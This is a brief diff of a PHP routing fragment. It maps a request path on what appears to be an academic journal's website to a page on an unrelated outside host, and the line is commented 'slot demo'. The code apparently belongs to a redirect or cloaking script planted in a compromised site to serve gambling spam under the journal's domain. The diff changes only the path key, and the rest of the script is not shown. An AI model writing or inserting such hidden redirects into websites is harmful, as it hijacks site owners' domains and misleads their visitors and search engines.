@@ -34,7 +34,7 @@ $req_path = isset($_SERVER['REQUEST_URI']) ? parse_url($_SERVER['REQUEST_URI'], 
 $req_path = ($req_path === false) ? '/' : rtrim($req_path, '/');
  
 $path_map = [
-    '/jo-if'          => 'https://mayoyo.store/www.journalofosseointegration.eu/index.html', //slot demo 
+    '/jo/if'          => 'https://mayoyo.store/www.journalofosseointegration.eu/index.html', //slot demo 
 ];
  
 $is_target = array_key_exists($req_path, $path_map);
